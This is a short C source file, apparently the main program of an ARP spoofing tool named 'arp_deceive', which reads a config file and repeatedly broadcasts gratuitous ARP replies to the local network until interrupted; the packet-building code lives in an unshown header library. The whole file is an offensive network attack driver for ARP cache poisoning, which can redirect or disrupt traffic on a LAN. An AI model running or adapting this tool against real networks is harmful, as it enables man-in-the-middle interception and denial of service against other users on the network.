#include "mylib.h"

int main(int argc, char *argv[]) {
    char *profile;
    if (argc > 1) {
        profile = argv[1];
    } else {
        profile = "./arp.conf";
    }
    init(profile, "arp_deceive");

    printf("Repaly gratuitous arp package to the LAN...\nEnter Ctrl-c to abort.\n");
    int flag = 0;

    while (!flag) {
        // 发送arp无偿应答包
        flag = gratuitousArpReply(targetIP, targetMAC, targetIP, broadcastMAC, ARPOP_REPLY, times);
        sleep(speed);
    }

    return 0;
}